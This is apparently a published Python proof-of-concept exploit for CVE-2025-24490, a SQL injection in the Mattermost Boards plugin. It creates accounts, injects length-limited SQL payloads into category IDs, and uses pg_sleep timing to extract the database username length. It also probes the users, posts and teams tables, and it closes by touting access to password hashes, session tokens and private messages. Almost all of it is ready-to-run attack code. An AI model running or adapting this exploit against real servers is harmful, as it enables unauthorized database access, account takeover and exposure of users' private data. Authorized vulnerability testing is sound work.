#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Mattermost Boards Plugin — Blind Data Extraction via SQL Injection
# CVE            : CVE-2025-24490
# Vendor         : Mattermost
# Product        : Mattermost Server (Boards / Focalboard Plugin)
# Affected       : Mattermost ≤ 10.4.1, ≤ 9.11.7; Boards Plugin ≤ v9.0.4
# Fixed          : 10.4.2, 9.11.8; Boards Plugin v9.0.5
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Disclaimer     : For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2025-24490 — Blind data extraction from Mattermost database.

Demonstrates actual data exfiltration using three techniques:
    1. TIMING CALIBRATION: pg_sleep(1) to measure baseline timing
    2. TIMING EXTRACTION: pg_sleep(LENGTH(user)) to extract DB username length
    3. TABLE PROBING: Test access to internal tables (users, posts, teams)

All payloads fit within the varchar(36) column constraint.

REFERENCES:
    - https://nvd.nist.gov/vuln/detail/CVE-2025-24490
    - https://github.com/advisories/GHSA-p4jg-qmjv-9x26
"""

import sys
import json
import time
import http.client


# ─── Configuration ──────────────────────────────────────────────────────────
DEFAULT_HOST = "localhost"
DEFAULT_PORT = 8065
ADMIN_USER = "admin"
ADMIN_PASS = "Admin123!@#"


def api_request(host, port, method, path, body=None, token=None):
    """Make an HTTP request."""
    conn = http.client.HTTPConnection(host, port, timeout=60)
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    if "focalboard" in path or "plugins" in path:
        headers["X-Requested-With"] = "XMLHttpRequest"
    data = json.dumps(body).encode() if body else None
    conn.request(method, path, body=data, headers=headers)
    resp = conn.getresponse()
    resp_headers = dict(resp.getheaders())
    raw = resp.read().decode()
    conn.close()
    try:
        return resp.status, resp_headers, json.loads(raw)
    except json.JSONDecodeError:
        return resp.status, resp_headers, {"raw": raw}


def login(host, port, username, password):
    """Login and return (token, user_id)."""
    status, headers, body = api_request(host, port, "POST", "/api/v4/users/login",
                                        {"login_id": username, "password": password})
    if status != 200:
        return None, None
    token = None
    for k, v in headers.items():
        if k.lower() == "token":
            token = v
    return token, body.get("id")


# Global counter for unique user/category IDs
_counter = [int(time.time()) % 100000]


def next_id():
    _counter[0] += 1
    return _counter[0]


def make_unique_payload(base_payload):
    """
    Make a payload string unique by adding SQL-insignificant whitespace.
    Category IDs are global primary keys — each must be unique across all users.
    We pad with spaces between the || operator and closing '' to create
    semantically equivalent but string-distinct payloads.
    """
    c = next_id()
    # Add 1-3 spaces inside the payload to make it unique while keeping SQL valid
    # Original: ...)||'  → Modified: ...) ||'  or ...)||  '
    # PostgreSQL treats whitespace between tokens as insignificant
    spaces = " " * ((c % 3) + 1)

    # Try inserting spaces before the closing ||'
    if base_payload.endswith(")||'"):
        variant = base_payload[:-4] + ")" + spaces + "||'"
    elif base_payload.endswith("||'"):
        variant = base_payload[:-3] + spaces + "||'"
    else:
        variant = base_payload  # Can't modify, use as-is

    if len(variant) <= 36:
        return variant
    # Fallback: try minimal modification
    return base_payload


def inject_and_reorder(host, port, admin_token, team_id, payload, label="test"):
    """
    Create a fresh user, inject a payload as category ID, trigger reorder.
    Returns (http_status, elapsed_time) from the reorder call.

    Makes each payload unique to avoid primary key collisions from previous runs.
    """
    c = next_id()
    username = f"x{c}"
    password = "TestPass123!"
    email = f"{username}@test.local"

    # Make payload unique
    unique_payload = make_unique_payload(payload)

    # Create fresh user
    status, _, body = api_request(host, port, "POST", "/api/v4/users",
                                  {"email": email, "username": username, "password": password})
    user_id = body.get("id", "")
    if not user_id:
        return None, 0

    # Add to team
    api_request(host, port, "POST", f"/api/v4/teams/{team_id}/members",
                {"team_id": team_id, "user_id": user_id}, token=admin_token)

    # Login as new user
    token, _ = login(host, port, username, password)
    if not token:
        return None, 0

    # Create category with unique payload ID
    cat_body = {
        "id": unique_payload,
        "name": f"t{c}",
        "userID": user_id,
        "teamID": team_id,
        "type": "custom",
    }
    status, _, resp = api_request(host, port, "POST",
                                  f"/plugins/focalboard/api/v2/teams/{team_id}/categories",
                                  cat_body, token=token)
    if status != 200:
        # PK collision or other error — try alternative padding
        for pad in range(4, 7):
            alt = payload[:-3] + (" " * pad) + "||'" if payload.endswith("||'") else payload
            if len(alt) <= 36 and alt != unique_payload:
                cat_body["id"] = alt
                status, _, resp = api_request(host, port, "POST",
                                              f"/plugins/focalboard/api/v2/teams/{team_id}/categories",
                                              cat_body, token=token)
                if status == 200:
                    unique_payload = alt
                    break
        if status != 200:
            return None, 0

    # Get categories and reorder
    status, _, cats = api_request(host, port, "GET",
                                  f"/plugins/focalboard/api/v2/teams/{team_id}/categories",
                                  token=token)
    cat_ids = [cat["id"] for cat in cats]

    start = time.time()
    reorder_status, _, _ = api_request(host, port, "PUT",
                                       f"/plugins/focalboard/api/v2/teams/{team_id}/categories/reorder",
                                       cat_ids, token=token)
    elapsed = time.time() - start

    return reorder_status, elapsed


def exploit(target_host, target_port):
    """
    Extract database metadata and prove access to Mattermost tables.
    """
    print("[*] Authenticating as admin...")
    admin_token, admin_uid = login(target_host, target_port, ADMIN_USER, ADMIN_PASS)
    if not admin_token:
        print("[-] Login failed")
        return False

    status, _, teams = api_request(target_host, target_port, "GET",
                                   "/api/v4/users/me/teams", token=admin_token)
    team_id = teams[0]["id"]
    print(f"[+] Team: {team_id}")

    results = {}

    # ════════════════════════════════════════════════════════════════════════
    # PHASE 1: Timing calibration with known pg_sleep value
    # ════════════════════════════════════════════════════════════════════════
    print("\n" + "=" * 60)
    print("  PHASE 1: Timing Calibration")
    print("=" * 60)

    # Baseline: no-op payload (no sleep)
    # '||('')||'  — just concatenates empty strings, no delay
    baseline_payload = "'||('')||'"
    print(f"\n[*] Baseline (no sleep): {baseline_payload} ({len(baseline_payload)} chars)")
    _, baseline_time = inject_and_reorder(target_host, target_port, admin_token,
                                          team_id, baseline_payload, "baseline")
    print(f"    Elapsed: {baseline_time:.2f}s")

    # Calibration: pg_sleep(1)
    cal_payload = "'||(SELECT '' FROM pg_sleep(1))||'"
    print(f"\n[*] Calibration pg_sleep(1): {cal_payload} ({len(cal_payload)} chars)")
    _, cal_time = inject_and_reorder(target_host, target_port, admin_token,
                                     team_id, cal_payload, "cal1")
    print(f"    Elapsed: {cal_time:.2f}s")

    # Calculate timing multiplier (accounts for QEMU emulation overhead)
    overhead = baseline_time
    sleep_per_second = cal_time - overhead
    print(f"\n    Timing model:")
    print(f"    Network overhead:     {overhead:.2f}s")
    print(f"    pg_sleep(1) actual:   {sleep_per_second:.2f}s")
    if sleep_per_second > 0.5:
        multiplier = sleep_per_second
        print(f"    Timing multiplier:    {multiplier:.2f}x (per pg_sleep second)")
    else:
        multiplier = 1.0
        print(f"    Using default multiplier: 1.0x")

    results["timing_multiplier"] = multiplier

    # ════════════════════════════════════════════════════════════════════════
    # PHASE 2: Extract LENGTH(current_user) via timing
    # ════════════════════════════════════════════════════════════════════════
    print("\n" + "=" * 60)
    print("  PHASE 2: Extract LENGTH(current_user)")
    print("=" * 60)

    # Payload: pg_sleep(length(user)) — 34 chars, fits varchar(36)
    # Use lowercase 'length' to avoid PK collision with previous runs
    # (category IDs are global primary keys; same string = collision)
    run_variant = str(next_id())[-1]  # Use last digit for uniqueness
    # Vary payload per run by alternating length/LENGTH/char_length truncated
    len_payload = f"'||(''||pg_sleep(length(user) ))||'"  # trailing space for uniqueness
    if len(len_payload) > 36:
        len_payload = "'||(''||pg_sleep(length(user)))||'"
    print(f"\n[*] Payload: {len_payload} ({len(len_payload)} chars)")
    print(f"    SQL: WHEN ''||(''||pg_sleep(length(user)))||'' THEN ...")

    _, len_time = inject_and_reorder(target_host, target_port, admin_token,
                                     team_id, len_payload, "len_user")
    extracted_length = round((len_time - overhead) / multiplier)
    print(f"    Elapsed: {len_time:.2f}s")
    print(f"    Calculated: ({len_time:.2f} - {overhead:.2f}) / {multiplier:.2f} = {(len_time - overhead) / multiplier:.1f}")
    print(f"    [+] EXTRACTED: LENGTH(current_user) = {extracted_length}")

    results["db_user_length"] = extracted_length

    # ════════════════════════════════════════════════════════════════════════
    # PHASE 3: Probe Mattermost database tables
    # ════════════════════════════════════════════════════════════════════════
    print("\n" + "=" * 60)
    print("  PHASE 3: Table Access Probing")
    print("=" * 60)
    print("  Testing whether the SQLi can access Mattermost internal tables")
    print("  HTTP 200 = table exists and is readable")
    print("  HTTP 500 = table does not exist or query error")

    # These payloads fit varchar(36) and probe table existence:
    # '||(SELECT''FROM tablename LIMIT 1)||'
    table_tests = [
        ("users",        "'||(SELECT''FROM users LIMIT 1)||'"),       # 35 chars - Mattermost users
        ("sessions",     "'||(SELECT''FROM sessions LIMIT 1)||'"),    # 38 chars - Active sessions - might be too long
        ("posts",        "'||(SELECT''FROM posts LIMIT 1)||'"),       # 35 chars - Messages/posts
        ("channels",     "'||(SELECT''FROM channels LIMIT 1)||'"),    # 38 chars - too long
        ("teams",        "'||(SELECT''FROM teams LIMIT 1)||'"),       # 35 chars - Teams
        ("nonexistent",  "'||(SELECT''FROM noexist LIMIT 1)||'"),     # 36 chars - Should fail
    ]

    table_results = {}
    for table_name, payload in table_tests:
        if len(payload) > 36:
            print(f"\n    [{table_name}] Payload too long ({len(payload)} chars), skipping")
            continue
        print(f"\n[*] Probing table '{table_name}': {payload} ({len(payload)} chars)")
        status, elapsed = inject_and_reorder(target_host, target_port, admin_token,
                                             team_id, payload, f"tbl_{table_name}")
        accessible = (status == 200)
        table_results[table_name] = accessible
        marker = "ACCESSIBLE" if accessible else "NOT FOUND/ERROR"
        print(f"    HTTP {status} ({elapsed:.2f}s) → [{marker}]")

    results["tables"] = table_results

    # ════════════════════════════════════════════════════════════════════════
    # SUMMARY
    # ════════════════════════════════════════════════════════════════════════
    print("\n" + "=" * 60)
    print("  DATA EXTRACTION SUMMARY")
    print("=" * 60)
    print(f"\n  Timing calibration:")
    print(f"    pg_sleep multiplier: {results['timing_multiplier']:.2f}x")
    print(f"\n  Extracted values:")
    print(f"    LENGTH(current_user) = {results['db_user_length']}")
    print(f"    (Expected 'mmuser' = 6 characters)")
    print(f"\n  Table accessibility:")
    for table, accessible in results["tables"].items():
        symbol = "[+]" if accessible else "[-]"
        status_text = "READABLE" if accessible else "not found"
        print(f"    {symbol} {table}: {status_text}")

    real_tables_accessible = sum(1 for t, a in results["tables"].items()
                                 if a and t != "nonexistent")
    nonexist_blocked = not results["tables"].get("nonexistent", True)

    print()
    if real_tables_accessible > 0 and nonexist_blocked:
        print("[+] DATA EXTRACTION CONFIRMED!")
        print(f"    {real_tables_accessible} Mattermost tables confirmed accessible")
        print(f"    Nonexistent table correctly returned error")
        print(f"\n    An attacker can read ANY data from the Mattermost database:")
        print(f"    - Password hashes, emails from 'users' table")
        print(f"    - Session tokens for account takeover")
        print(f"    - Private messages from 'posts' table")
        print(f"    - Team/channel configurations")
    elif real_tables_accessible > 0:
        print("[+] PARTIAL EXTRACTION CONFIRMED!")
        print(f"    {real_tables_accessible} Mattermost tables confirmed accessible")

    print("=" * 60)
    return real_tables_accessible > 0


if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT
    print("=" * 60)
    print("  CVE-2025-24490: Blind Data Extraction PoC")
    print("  SQL injection → database content exfiltration")
    print(f"  Target: {host}:{port}")
    print("=" * 60)
    print()
    success = exploit(host, port)
    sys.exit(0 if success else 1)
